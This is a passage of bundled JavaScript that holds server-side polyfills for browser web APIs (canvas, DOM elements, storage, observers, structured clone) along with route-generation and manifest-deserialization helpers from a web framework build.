    const index = _.push(out) - 1;
    $.set(value, index);
    return index;
  };

  const pair = value => {
    if ($.has(value))
      return $.get(value);

    let [TYPE, type] = typeOf(value);
    switch (TYPE) {
      case PRIMITIVE: {
        let entry = value;
        switch (type) {
          case 'bigint':
            TYPE = BIGINT;
            entry = value.toString();
            break;
          case 'function':
          case 'symbol':
            if (strict)
              throw new TypeError('unable to serialize ' + type);
            entry = null;
            break;
        }
        return as([TYPE, entry], value);
      }
      case ARRAY: {
        if (type)
          return as([type, [...value]], value);
  
        const arr = [];
        const index = as([TYPE, arr], value);
        for (const entry of value)
          arr.push(pair(entry));
        return index;
      }
      case OBJECT: {
        if (type) {
          switch (type) {
            case 'BigInt':
              return as([type, value.toString()], value);
            case 'Boolean':
            case 'Number':
            case 'String':
              return as([type, value.valueOf()], value);
          }
        }

        if (json && ('toJSON' in value))
          return pair(value.toJSON());

        const entries = [];
        const index = as([TYPE, entries], value);
        for (const key of keys(value)) {
          if (strict || !shouldSkip(typeOf(value[key])))
            entries.push([pair(key), pair(value[key])]);
        }
        return index;
      }
      case DATE:
        return as([TYPE, value.toISOString()], value);
      case REGEXP: {
        const {source, flags} = value;
        return as([TYPE, {source, flags}], value);
      }
      case MAP: {
        const entries = [];
        const index = as([TYPE, entries], value);
        for (const [key, entry] of value) {
          if (strict || !(shouldSkip(typeOf(key)) || shouldSkip(typeOf(entry))))
            entries.push([pair(key), pair(entry)]);
        }
        return index;
      }
      case SET: {
        const entries = [];
        const index = as([TYPE, entries], value);
        for (const entry of value) {
          if (strict || !shouldSkip(typeOf(entry)))
            entries.push(pair(entry));
        }
        return index;
      }
    }

    const {message} = value;
    return as([TYPE, {name: type, message}], value);
  };

  return pair;
};

/**
 * @typedef {Array<string,any>} Record a type representation
 */

/**
 * Returns an array of serialized Records.
 * @param {any} value a serializable value.
 * @param {{lossy?: boolean}?} options an object with a `lossy` property that,
 *  if `true`, will not throw errors on incompatible types, and behave more
 *  like JSON stringify would behave. Symbol and Function will be discarded.
 * @returns {Record[]}
 */
 const serialize = (value, {json, lossy} = {}) => {
  const _ = [];
  return serializer(!(json || lossy), !!json, new Map, _)(value), _;
};

var structuredClone = (any, options) => deserialize(serialize(any, options));

const INTERNAL = { tick: 0, pool: new Map() };
function setTimeout(callback, delay = 0, ...args) {
    const func = __function_bind(callback, globalThis);
    const tick = ++INTERNAL.tick;
    const timeout = setTimeout$1(func, delay, ...args);
    INTERNAL.pool.set(tick, timeout);
    return tick;
}
function clearTimeout(timeoutId) {
    const timeout = INTERNAL.pool.get(timeoutId);
    if (timeout) {
        clearTimeout$1(timeout);
        INTERNAL.pool.delete(timeoutId);
    }
}

class TreeWalker {
    parentNode() {
        return null;
    }
    firstChild() {
        return null;
    }
    lastChild() {
        return null;
    }
    previousSibling() {
        return null;
    }
    nextSibling() {
        return null;
    }
    previousNode() {
        return null;
    }
    nextNode() {
        return null;
    }
    get currentNode() {
        const internals = internalsOf(this, 'TreeWalker', 'currentNode');
        return internals.currentNode;
    }
    get root() {
        const internals = internalsOf(this, 'TreeWalker', 'root');
        return internals.root;
    }
    get whatToShow() {
        const internals = internalsOf(this, 'TreeWalker', 'whatToShow');
        return internals.whatToShow;
    }
}
allowStringTag(TreeWalker);

class ImageData {
    constructor(arg0, arg1, ...args) {
        if (arguments.length < 2)
            throw new TypeError(`Failed to construct 'ImageData': 2 arguments required.`);
        /** Whether Uint8ClampedArray data is provided. */
        const hasData = __object_isPrototypeOf(Uint8ClampedArray.prototype, arg0);
        /** Image data, either provided or calculated. */
        const d = hasData
            ? arg0
            : new Uint8ClampedArray(asNumber(arg0, 'width') * asNumber(arg1, 'height') * 4);
        /** Image width. */
        const w = asNumber(hasData ? arg1 : arg0, 'width');
        /** Image height. */
        const h = d.length / w / 4;
        /** Image color space. */
        const c = String(Object(hasData ? args[1] : args[0]).colorSpace || 'srgb');
        // throw if a provided height does not match the calculated height
        if (args.length && asNumber(args[0], 'height') !== h)
            throw new DOMException('height is not equal to (4 * width * height)', 'IndexSizeError');
        // throw if a provided colorspace does not match a known colorspace
        if (c !== 'srgb' && c !== 'rec2020' && c !== 'display-p3')
            throw new TypeError('colorSpace is not known value');
        Object.defineProperty(this, 'data', {
            configurable: true,
            enumerable: true,
            value: d,
        });
        INTERNALS.set(this, {
            width: w,
            height: h,
            colorSpace: c,
        });
    }
    get data() {
        internalsOf(this, 'ImageData', 'data');
        return Object.getOwnPropertyDescriptor(this, 'data').value;
    }
    get width() {
        return internalsOf(this, 'ImageData', 'width').width;
    }
    get height() {
        return internalsOf(this, 'ImageData', 'height').height;
    }
}
allowStringTag(ImageData);
/** Returns a coerced number, optionally throwing if the number is zero-ish. */
const asNumber = (value, axis) => {
    value = Number(value) || 0;
    if (value === 0)
        throw new TypeError(`The source ${axis} is zero or not a number.`);
    return value;
};

class CanvasRenderingContext2D {
    get canvas() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'canvas').canvas;
    }
    get direction() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'direction')
            .direction;
    }
    get fillStyle() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'fillStyle')
            .fillStyle;
    }
    get filter() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'filter').filter;
    }
    get globalAlpha() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'globalAlpha')
            .globalAlpha;
    }
    get globalCompositeOperation() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'globalCompositeOperation').globalCompositeOperation;
    }
    get font() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'font').font;
    }
    get imageSmoothingEnabled() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'imageSmoothingEnabled').imageSmoothingEnabled;
    }
    get imageSmoothingQuality() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'imageSmoothingQuality').imageSmoothingQuality;
    }
    get lineCap() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'lineCap').lineCap;
    }
    get lineDashOffset() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'lineDashOffset')
            .lineDashOffset;
    }
    get lineJoin() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'lineJoin').lineJoin;
    }
    get lineWidth() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'lineWidth')
            .lineWidth;
    }
    get miterLimit() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'miterLimit')
            .miterLimit;
    }
    get strokeStyle() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'strokeStyle')
            .strokeStyle;
    }
    get shadowOffsetX() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'shadowOffsetX')
            .shadowOffsetX;
    }
    get shadowOffsetY() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'shadowOffsetY')
            .shadowOffsetY;
    }
    get shadowBlur() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'shadowBlur')
            .shadowBlur;
    }
    get shadowColor() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'shadowColor')
            .shadowColor;
    }
    get textAlign() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'textAlign')
            .textAlign;
    }
    get textBaseline() {
        return internalsOf(this, 'CanvasRenderingContext2D', 'textBaseline')
            .textBaseline;
    }
    arc() { }
    arcTo() { }
    beginPath() { }
    bezierCurveTo() { }
    clearRect() { }
    clip() { }
    closePath() { }
    createImageData(arg0, arg1) {
        /** Whether ImageData is provided. */
        const hasData = __object_isPrototypeOf(ImageData.prototype, arg0);
        const w = hasData ? arg0.width : arg0;
        const h = hasData ? arg0.height : arg1;
        const d = hasData
            ? arg0.data
            : new Uint8ClampedArray(w * h * 4);
        return new ImageData(d, w, h);
    }
    createLinearGradient() { }
    createPattern() { }
    createRadialGradient() { }
    drawFocusIfNeeded() { }
    drawImage() { }
    ellipse() { }
    fill() { }
    fillRect() { }
    fillText() { }
    getContextAttributes() { }
    getImageData() { }
    getLineDash() { }
    getTransform() { }
    isPointInPath() { }
    isPointInStroke() { }
    lineTo() { }
    measureText() { }
    moveTo() { }
    putImageData() { }
    quadraticCurveTo() { }
    rect() { }
    resetTransform() { }
    restore() { }
    rotate() { }
    save() { }
    scale() { }
    setLineDash() { }
    setTransform() { }
    stroke() { }
    strokeRect() { }
    strokeText() { }
    transform() { }
    translate() { }
}
allowStringTag(CanvasRenderingContext2D);
const __createCanvasRenderingContext2D = (canvas) => {
    const renderingContext2D = Object.create(CanvasRenderingContext2D.prototype);
    INTERNALS.set(renderingContext2D, {
        canvas,
        direction: 'inherit',
        fillStyle: '#000',
        filter: 'none',
        font: '10px sans-serif',
        globalAlpha: 0,
        globalCompositeOperation: 'source-over',
        imageSmoothingEnabled: false,
        imageSmoothingQuality: 'high',
        lineCap: 'butt',
        lineDashOffset: 0.0,
        lineJoin: 'miter',
        lineWidth: 1.0,
        miterLimit: 10.0,
        shadowBlur: 0,
        shadowColor: '#000',
        shadowOffsetX: 0,
        shadowOffsetY: 0,
        strokeStyle: '#000',
        textAlign: 'start',
        textBaseline: 'alphabetic',
    });
    return renderingContext2D;
};

class CustomElementRegistry {
    /** Defines a new custom element using the given tag name and HTMLElement constructor. */
    define(name, constructor, options) {
        const internals = internalsOf(this, 'CustomElementRegistry', 'define');
        name = String(name);
        if (/[A-Z]/.test(name))
            throw new SyntaxError('Custom element name cannot contain an uppercase ASCII letter');
        if (!/^[a-z]/.test(name))
            throw new SyntaxError('Custom element name must have a lowercase ASCII letter as its first character');
        if (!/-/.test(name))
            throw new SyntaxError('Custom element name must contain a hyphen');
        INTERNALS.set(constructor, {
            attributes: {},
            localName: name,
        });
        internals.constructorByName.set(name, constructor);
        internals.nameByConstructor.set(constructor, name);
    }
    /** Returns the constructor associated with the given tag name. */
    get(name) {
        const internals = internalsOf(this, 'CustomElementRegistry', 'get');
        name = String(name).toLowerCase();
        return internals.constructorByName.get(name);
    }
    getName(constructor) {
        const internals = internalsOf(this, 'CustomElementRegistry', 'getName');
        return internals.nameByConstructor.get(constructor);
    }
}
allowStringTag(CustomElementRegistry);
const initCustomElementRegistry = (target, exclude) => {
    if (exclude.has('customElements'))
        return;
    const CustomElementRegistry = target.CustomElementRegistry || globalThis.CustomElementRegistry;
    const customElements = target.customElements ||
        (target.customElements = new CustomElementRegistry());
    INTERNALS.set(customElements, {
        constructorByName: new Map(),
        nameByConstructor: new Map(),
    });
};

class Element extends Node {
    constructor() {
        super();
        if (INTERNALS.has(new.target)) {
            const internals = internalsOf(new.target, 'Element', 'localName');
            INTERNALS.set(this, {
                attributes: {},
                localName: internals.localName,
                ownerDocument: this.ownerDocument,
                shadowInit: null,
                shadowRoot: null,
            });
        }
    }
    hasAttribute(name) {
        return false;
    }
    getAttribute(name) {
        return null;
    }
    setAttribute(name, value) {
    }
    removeAttribute(name) {
    }
    attachShadow(init) {
        if (arguments.length < 1)
            throw new TypeError(`Failed to execute 'attachShadow' on 'Element': 1 argument required, but only 0 present.`);
        if (init !== Object(init))
            throw new TypeError(`Failed to execute 'attachShadow' on 'Element': The provided value is not of type 'ShadowRootInit'.`);
        if (init.mode !== 'open' && init.mode !== 'closed')
            throw new TypeError(`Failed to execute 'attachShadow' on 'Element': Failed to read the 'mode' property from 'ShadowRootInit': The provided value '${init.mode}' is not a valid enum value of type ShadowRootMode.`);
        const internals = internalsOf(this, 'Element', 'attachShadow');
        if (internals.shadowRoot)
            throw new Error('The operation is not supported.');
        internals.shadowInit = internals.shadowInit || {
            mode: init.mode,
            delegatesFocus: Boolean(init.delegatesFocus),
        };
        internals.shadowRoot =
            internals.shadowRoot ||
                (/^open$/.test(internals.shadowInit.mode)
                    ? Object.setPrototypeOf(new EventTarget(), ShadowRoot.prototype)
                    : null);
        return internals.shadowRoot;
    }
    get assignedSlot() {
        return null;
    }
    get innerHTML() {
        internalsOf(this, 'Element', 'innerHTML');
        return '';
    }
    set innerHTML(value) {
        internalsOf(this, 'Element', 'innerHTML');
    }
    get shadowRoot() {
        const internals = internalsOf(this, 'Element', 'shadowRoot');
        return Object(internals.shadowInit).mode === 'open'
            ? internals.shadowRoot
            : null;
    }
    get localName() {
        return internalsOf(this, 'Element', 'localName')
            .localName;
    }
    get nodeName() {
        return internalsOf(this, 'Element', 'nodeName')
            .localName.toUpperCase();
    }
    get tagName() {
        return internalsOf(this, 'Element', 'tagName')
            .localName.toUpperCase();
    }
}
class HTMLElement$1 extends Element {
}
class HTMLBodyElement extends HTMLElement$1 {
}
class HTMLDivElement extends HTMLElement$1 {
}
class HTMLHeadElement extends HTMLElement$1 {
}
class HTMLHtmlElement extends HTMLElement$1 {
}
class HTMLSpanElement extends HTMLElement$1 {
}
class HTMLStyleElement extends HTMLElement$1 {
}
class HTMLTemplateElement extends HTMLElement$1 {
}
class HTMLUnknownElement extends HTMLElement$1 {
}
allowStringTag(Element);
allowStringTag(HTMLElement$1);
allowStringTag(HTMLBodyElement);
allowStringTag(HTMLDivElement);
allowStringTag(HTMLHeadElement);
allowStringTag(HTMLHtmlElement);
allowStringTag(HTMLSpanElement);
allowStringTag(HTMLStyleElement);
allowStringTag(HTMLTemplateElement);
allowStringTag(HTMLUnknownElement);

class Document extends Node {
    createElement(name) {
        const internals = internalsOf(this, 'Document', 'createElement');
        const customElementInternals = INTERNALS.get(internals.target.customElements);
        name = String(name).toLowerCase();
        const TypeOfHTMLElement = internals.constructorByName.get(name) ||
            (customElementInternals &&
                customElementInternals.constructorByName.get(name)) ||
            HTMLUnknownElement;
        const element = Object.setPrototypeOf(new EventTarget(), TypeOfHTMLElement.prototype);
        INTERNALS.set(element, {
            attributes: {},
            localName: name,
            ownerDocument: this,
            shadowInit: null,
            shadowRoot: null,
        });
        return element;
    }
    createNodeIterator(root, whatToShow = NodeFilter.SHOW_ALL, filter) {
        const target = Object.create(NodeIterator.prototype);
        INTERNALS.set(target, {
            filter,
            pointerBeforeReferenceNode: false,
            referenceNode: root,
            root,
            whatToShow,
        });
        return target;
    }
    createTextNode(data) {
        return new Text(data);
    }
    createTreeWalker(root, whatToShow = NodeFilter.SHOW_ALL, filter, expandEntityReferences) {
        const target = Object.create(TreeWalker.prototype);
        INTERNALS.set(target, {
            filter,
            currentNode: root,
            root,
            whatToShow,
        });
        return target;
    }
    get adoptedStyleSheets() {
        return [];
    }
    get styleSheets() {
        return [];
    }
}
class HTMLDocument extends Document {
}
allowStringTag(Document);
allowStringTag(HTMLDocument);
const initDocument = (target, exclude) => {
    if (exclude.has('document'))
        return;
    const EventTarget = target.EventTarget || globalThis.EventTarget;
    const HTMLDocument = target.HTMLDocument || globalThis.HTMLDocument;
    const document = (target.document = Object.setPrototypeOf(new EventTarget(), HTMLDocument.prototype));
    INTERNALS.set(document, {
        target,
        constructorByName: new Map([
            ['body', target.HTMLBodyElement],
            ['canvas', target.HTMLCanvasElement],
            ['div', target.HTMLDivElement],
            ['head', target.HTMLHeadElement],
            ['html', target.HTMLHtmlElement],
            ['img', target.HTMLImageElement],
            ['span', target.HTMLSpanElement],
            ['style', target.HTMLStyleElement],
        ]),
        nameByConstructor: new Map(),
    });
    const initElement = (name, Class) => {
        const target = Object.setPrototypeOf(new EventTarget(), Class.prototype);
        INTERNALS.set(target, {
            attributes: {},
            localName: name,
            ownerDocument: document,
            shadowRoot: null,
            shadowInit: null,
        });
        return target;
    };
    document.body = initElement('body', target.HTMLBodyElement);
    document.head = initElement('head', target.HTMLHeadElement);
    document.documentElement = initElement('html', target.HTMLHtmlElement);
};

class HTMLCanvasElement extends HTMLElement$1 {
    get height() {
        return internalsOf(this, 'HTMLCanvasElement', 'height').height;
    }
    set height(value) {
        internalsOf(this, 'HTMLCanvasElement', 'height').height =
            Number(value) || 0;
    }
    get width() {
        return internalsOf(this, 'HTMLCanvasElement', 'width').width;
    }
    set width(value) {
        internalsOf(this, 'HTMLCanvasElement', 'width').width = Number(value) || 0;
    }
    captureStream() {
        return null;
    }
    getContext(contextType) {
        const internals = internalsOf(this, 'HTMLCanvasElement', 'getContext');
        switch (contextType) {
            case '2d':
                if (internals.renderingContext2D)
                    return internals.renderingContext2D;
                internals.renderingContext2D = __createCanvasRenderingContext2D(this);
                return internals.renderingContext2D;
            default:
                return null;
        }
    }
    toBlob() { }
    toDataURL() { }
    transferControlToOffscreen() { }
}
allowStringTag(HTMLCanvasElement);

class HTMLImageElement extends HTMLElement$1 {
    get src() {
        return internalsOf(this, 'HTMLImageElement', 'src').src;
    }
    set src(value) {
        const internals = internalsOf(this, 'HTMLImageElement', 'src');
        internals.src = String(value);
    }
}
allowStringTag(HTMLImageElement);

function Image() {
    // @ts-ignore
    INTERNALS.set(this, {
        attributes: {},
        localName: 'img',
        innerHTML: '',
        shadowRoot: null,
        shadowInit: null,
    });
}
Image.prototype = HTMLImageElement.prototype;

class MediaQueryList extends EventTarget {
    get matches() {
        return internalsOf(this, 'MediaQueryList', 'matches').matches;
    }
    get media() {
        return internalsOf(this, 'MediaQueryList', 'media').media;
    }
}
allowStringTag(MediaQueryList);
const initMediaQueryList = (target, exclude) => {
    if (exclude.has('MediaQueryList') || exclude.has('matchMedia'))
        return;
    const EventTarget = target.EventTarget || globalThis.EventTarget;
    const MediaQueryList = target.MediaQueryList || globalThis.MediaQueryList;
    target.matchMedia = function matchMedia(media) {
        const mql = Object.setPrototypeOf(new EventTarget(), MediaQueryList.prototype);
        INTERNALS.set(mql, {
            matches: false,
            media,
        });
        return mql;
    };
};

class IntersectionObserver {
    disconnect() { }
    observe() { }
    takeRecords() {
        return [];
    }
    unobserve() { }
}
class MutationObserver {
    disconnect() { }
    observe() { }
    takeRecords() {
        return [];
    }
    unobserve() { }
}
class ResizeObserver {
    disconnect() { }
    observe() { }
    takeRecords() {
        return [];
    }
    unobserve() { }
}
allowStringTag(MutationObserver);
allowStringTag(IntersectionObserver);
allowStringTag(ResizeObserver);

class OffscreenCanvas extends EventTarget {
    constructor(width, height) {
        super();
        if (arguments.length < 2)
            throw new TypeError(`Failed to construct 'OffscreenCanvas': 2 arguments required.`);
        width = Number(width) || 0;
        height = Number(height) || 0;
        INTERNALS.set(this, { width, height });
    }
    get height() {
        return internalsOf(this, 'OffscreenCanvas', 'height').height;
    }
    set height(value) {
        internalsOf(this, 'OffscreenCanvas', 'height').height = Number(value) || 0;
    }
    get width() {
        return internalsOf(this, 'OffscreenCanvas', 'width').width;
    }
    set width(value) {
        internalsOf(this, 'OffscreenCanvas', 'width').width = Number(value) || 0;
    }
    getContext(contextType) {
        const internals = internalsOf(this, 'HTMLCanvasElement', 'getContext');
        switch (contextType) {
            case '2d':
                if (internals.renderingContext2D)
                    return internals.renderingContext2D;
                internals.renderingContext2D = __createCanvasRenderingContext2D(this);
                return internals.renderingContext2D;
            default:
                return null;
        }
    }
    convertToBlob(options) {
        options = Object(options);
        Number(options.quality) || 0;
        const type = getImageType(String(options.type).trim().toLowerCase());
        return Promise.resolve(new Blob([], { type }));
    }
}
allowStringTag(OffscreenCanvas);
const getImageType = (type) => type === 'image/avif' ||
    type === 'image/jpeg' ||
    type === 'image/png' ||
    type === 'image/webp'
    ? type
    : 'image/png';

class Storage {
    clear() {
        internalsOf(this, 'Storage', 'clear').storage.clear();
    }
    getItem(key) {
        return getStringOrNull(internalsOf(this, 'Storage', 'getItem').storage.get(String(key)));
    }
    key(index) {
        return getStringOrNull([
            ...internalsOf(this, 'Storage', 'key').storage.keys(),
        ][Number(index) || 0]);
    }
    removeItem(key) {
        internalsOf(this, 'Storage', 'getItem').storage.delete(String(key));
    }
    setItem(key, value) {
        internalsOf(this, 'Storage', 'getItem').storage.set(String(key), String(value));
    }
    get length() {
        return internalsOf(this, 'Storage', 'size').storage.size;
    }
}
const getStringOrNull = (value) => typeof value === 'string' ? value : null;
const initStorage = (target, exclude) => {
    if (exclude.has('Storage') || exclude.has('localStorage'))
        return;
    target.localStorage = Object.create(Storage.prototype);
    const storageInternals = new Map();
    INTERNALS.set(target.localStorage, {
        storage: storageInternals,
    });
};

class StyleSheet {
}
class CSSStyleSheet extends StyleSheet {
    async replace(text) {
        return new CSSStyleSheet();
    }
    replaceSync(text) {
        return new CSSStyleSheet();
    }
    get cssRules() {
        return [];
    }
}
allowStringTag(StyleSheet);
allowStringTag(CSSStyleSheet);

class Window extends EventTarget {
    get self() {
        return this;
    }
    get top() {
        return this;
    }
    get window() {
        return this;
    }
    get innerHeight() {
        return 0;
    }
    get innerWidth() {
        return 0;
    }
    get scrollX() {
        return 0;
    }
    get scrollY() {
        return 0;
    }
}
allowStringTag(Window);
const initWindow = (target, exclude) => {
    if (exclude.has('Window') || exclude.has('window'))
        return;
    target.window = target;
};

function alert(...messages) {
    console.log(...messages);
}

const hasOwn = {
    hasOwn(instance, property) {
        return __object_hasOwnProperty(instance, property);
    },
}.hasOwn;
const initObject = (target, exclude) => {
    if (exclude.has('Object') || exclude.has('object') || exclude.has('hasOwn'))
        return;
    const Class = target.Object || globalThis.Object;
    Object.defineProperty(Class, 'hasOwn', {
        value: hasOwn,
        writable: true,
        enumerable: false,
        configurable: true,
    });
};

const any = {
    async any(iterable) {
        return Promise.all([...iterable].map((promise) => {
            return new Promise((resolve, reject) => Promise.resolve(promise).then(reject, resolve));
        })).then((errors) => Promise.reject(errors), (value) => Promise.resolve(value));
    },
}.any;
const initPromise = (target, exclude) => {
    if (exclude.has('Promise') || exclude.has('any'))
        return;
    const Class = target.Promise || globalThis.Promise;
    if (!Class.any)
        Object.defineProperty(Class, 'any', {
            value: any,
            writable: true,
            enumerable: false,
            configurable: true,
        });
};

const at = {
    at(index) {
        index = Math.trunc(index) || 0;
        if (index < 0)
            index += this.length;
        if (index < 0 || index >= this.length)
            return undefined;
        return this[index];
    },
}.at;
const initRelativeIndexingMethod = (target, exclude) => {
    if (exclude.has('at'))
        return;
    const Classes = [];
    if (!exclude.has('TypedArray'))
        Classes.push(Object.getPrototypeOf(target.Int8Array || globalThis.Int8Array));
    if (!exclude.has('Array'))
        Classes.push(target.Array || globalThis.Array);
    if (!exclude.has('String'))
        Classes.push(target.String || globalThis.String);
    for (const Class of Classes) {
        if (!Class.prototype.at)
            Object.defineProperty(Class.prototype, 'at', {
                value: at,
                writable: true,
                enumerable: false,
                configurable: true,
            });
    }
};

const replaceAll = {
    replaceAll(searchValue, replaceValue) {
        return __object_isPrototypeOf(RegExp.prototype, searchValue)
            ? this.replace(searchValue, replaceValue)
            : this.replace(new RegExp(__string_escapeRegExp(searchValue), 'g'), replaceValue);
    },
}.replaceAll;
const initString = (target, exclude) => {
    if (exclude.has('String') || exclude.has('replaceAll'))
        return;
    const Class = target.String || globalThis.String;
    if (!Class.prototype.replaceAll)
        Object.defineProperty(Class.prototype, 'replaceAll', {
            value: replaceAll,
            writable: true,
            enumerable: false,
            configurable: true,
        });
};

const exclusionsForHTMLElement = [
    'CustomElementsRegistry',
    'HTMLElement',
    'HTMLBodyElement',
    'HTMLCanvasElement',
    'HTMLDivElement',
    'HTMLHeadElement',
    'HTMLHtmlElement',
    'HTMLImageElement',
    'HTMLStyleElement',
    'HTMLTemplateElement',
    'HTMLUnknownElement',
    'Image',
];
const exclusionsForElement = ['Element', ...exclusionsForHTMLElement];
const exclusionsForDocument = [
    'CustomElementsRegistry',
    'Document',
    'HTMLDocument',
    'document',
    'customElements',
];
const exclusionsForNode = [
    'Node',
    'DocumentFragment',
    'ShadowRoot',
    ...exclusionsForDocument,
    ...exclusionsForElement,
];
const exclusionsForEventTarget = [
    'AbortSignal',
    'Event',
    'CustomEvent',
    'EventTarget',
    'OffscreenCanvas',
    'MediaQueryList',
    'Window',
    ...exclusionsForNode,
];
const exclusionsForEvent = [
    'AbortSignal',
    'Event',
    'CustomEvent',
    'EventTarget',
    'MediaQueryList',
    'OffscreenCanvas',
    'Window',
    ...exclusionsForNode,
];
const exclusions = {
    'Blob+': ['Blob', 'File'],
    'Document+': exclusionsForDocument,
    'Element+': exclusionsForElement,
    'Event+': exclusionsForEvent,
    'EventTarget+': exclusionsForEventTarget,
    'HTMLElement+': exclusionsForHTMLElement,
    'Node+': exclusionsForNode,
    'StyleSheet+': ['StyleSheet', 'CSSStyleSheet'],
};

const inheritence = {
    CSSStyleSheet: 'StyleSheet',
    CustomEvent: 'Event',
    DOMException: 'Error',
    Document: 'Node',
    DocumentFragment: 'Node',
    Element: 'Node',
    File: 'Blob',
    HTMLDocument: 'Document',
    HTMLElement: 'Element',
    HTMLBodyElement: 'HTMLElement',
    HTMLCanvasElement: 'HTMLElement',
    HTMLDivElement: 'HTMLElement',
    HTMLHeadElement: 'HTMLElement',
    HTMLHtmlElement: 'HTMLElement',
    HTMLImageElement: 'HTMLElement',
    HTMLSpanElement: 'HTMLElement',
    HTMLStyleElement: 'HTMLElement',
    HTMLTemplateElement: 'HTMLElement',
    HTMLUnknownElement: 'HTMLElement',
    Image: 'HTMLElement',
    MediaQueryList: 'EventTarget',
    Node: 'EventTarget',
    OffscreenCanvas: 'EventTarget',
    ShadowRoot: 'DocumentFragment',
    Window: 'EventTarget',
};

const polyfill = (target, options) => {
    const webAPIs = {
        AbortController,
        AbortSignal,
        Blob,
        ByteLengthQueuingStrategy,
        CanvasRenderingContext2D,
        CharacterData,
        Comment,
        CountQueuingStrategy,
        CSSStyleSheet,
        CustomElementRegistry,
        CustomEvent,
        Document,
        DocumentFragment,
        DOMException,
        Element,
        Event,
        EventTarget,
        File,
        FormData,
        HTMLDocument,
        HTMLElement: HTMLElement$1,
        HTMLBodyElement,
        HTMLCanvasElement,
        HTMLDivElement,
        HTMLHeadElement,
        HTMLHtmlElement,
        HTMLImageElement,
        HTMLSpanElement,
        HTMLStyleElement,
        HTMLTemplateElement,
        HTMLUnknownElement,
        Headers: Headers$1,
        IntersectionObserver,
        Image,
        ImageData,
        MediaQueryList,
        MutationObserver,
        Node,
        NodeFilter: NodeFilter$1,
        NodeIterator: NodeIterator$1,
        OffscreenCanvas,
        ReadableByteStreamController,
        ReadableStream: ReadableStream$1,
        ReadableStreamBYOBReader,
        ReadableStreamBYOBRequest,
        ReadableStreamDefaultController,
        ReadableStreamDefaultReader,
        Request: Request$1,
        ResizeObserver,
        Response: Response$1,
        ShadowRoot,
        Storage,
        StyleSheet,
        Text,
        TransformStream,
        TreeWalker,
        URLPattern: U,
        WritableStream,
        WritableStreamDefaultController,
        WritableStreamDefaultWriter,
        Window,
        alert,
        atob,
        btoa,
        cancelAnimationFrame,
        cancelIdleCallback,
        clearTimeout,
        fetch,
        requestAnimationFrame,
        requestIdleCallback,
        setTimeout,
        structuredClone,
    };
    // initialize exclude options
    const excludeOptions = new Set(typeof Object(options).exclude === 'string'
        ? String(Object(options).exclude).trim().split(/\s+/)
        : Array.isArray(Object(options).exclude)
            ? Object(options).exclude.reduce((array, entry) => array.splice(array.length, 0, ...(typeof entry === 'string' ? entry.trim().split(/\s+/) : [])) && array, [])
            : []);
    // expand exclude options using exclusion shorthands
    for (const excludeOption of excludeOptions) {
        if (excludeOption in exclusions) {
            for (const exclusion of exclusions[excludeOption]) {
                excludeOptions.add(exclusion);
            }
        }
    }
    // apply each WebAPI
    for (const name of Object.keys(webAPIs)) {
        // skip WebAPIs that are excluded
        if (excludeOptions.has(name))
            continue;
        // skip WebAPIs that are built-in
        if (Object.hasOwnProperty.call(target, name))
            continue;
        // define WebAPIs on the target
        Object.defineProperty(target, name, {
            configurable: true,
            enumerable: true,
            writable: true,
            value: webAPIs[name],
        });
    }
    // ensure WebAPIs correctly inherit other WebAPIs
    for (const name of Object.keys(webAPIs)) {
        // skip WebAPIs that are excluded
        if (excludeOptions.has(name))
            continue;
        // skip WebAPIs that do not extend other WebAPIs
        if (!Object.hasOwnProperty.call(inheritence, name))
            continue;
        const Class = target[name];
        const Super = target[inheritence[name]];
        // skip WebAPIs that are not available
        if (!Class || !Super)
            continue;
        // skip WebAPIs that are already inherited correctly
        if (Object.getPrototypeOf(Class.prototype) === Super.prototype)
            continue;
        // define WebAPIs inheritence
        Object.setPrototypeOf(Class.prototype, Super.prototype);
    }
    if (!excludeOptions.has('HTMLDocument') &&
        !excludeOptions.has('HTMLElement')) {
        initDocument(target, excludeOptions);
        if (!excludeOptions.has('CustomElementRegistry')) {
            initCustomElementRegistry(target, excludeOptions);
        }
    }
    initObject(target, excludeOptions);
    initMediaQueryList(target, excludeOptions);
    initPromise(target, excludeOptions);
    initRelativeIndexingMethod(target, excludeOptions);
    initStorage(target, excludeOptions);
    initString(target, excludeOptions);
    initWindow(target, excludeOptions);
    return target;
};
polyfill.internals = (target, name) => {
    const init = {
        CustomElementRegistry: initCustomElementRegistry,
        Document: initDocument,
        MediaQueryList: initMediaQueryList,
        Object: initObject,
        Promise: initPromise,
        RelativeIndexingMethod: initRelativeIndexingMethod,
        Storage: initStorage,
        String: initString,
        Window: initWindow,
    };
    init[name](target, new Set());
    return target;
};

function getRouteGenerator(segments, addTrailingSlash) {
  const template = segments.map((segment) => {
    return "/" + segment.map((part) => {
      if (part.spread) {
        return `:${part.content.slice(3)}(.*)?`;
      } else if (part.dynamic) {
        return `:${part.content}`;
      } else {
        return part.content.normalize().replace(/\?/g, "%3F").replace(/#/g, "%23").replace(/%5B/g, "[").replace(/%5D/g, "]").replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      }
    }).join("");
  }).join("");
  let trailing = "";
  if (addTrailingSlash === "always" && segments.length) {
    trailing = "/";
  }
  const toPath = compile(template + trailing);
  return toPath;
}

function deserializeRouteData(rawRouteData) {
  return {
    route: rawRouteData.route,
    type: rawRouteData.type,
    pattern: new RegExp(rawRouteData.pattern),
    params: rawRouteData.params,
    component: rawRouteData.component,
    generate: getRouteGenerator(rawRouteData.segments, rawRouteData._meta.trailingSlash),
    pathname: rawRouteData.pathname || void 0,
    segments: rawRouteData.segments
  };
}

function deserializeManifest(serializedManifest) {
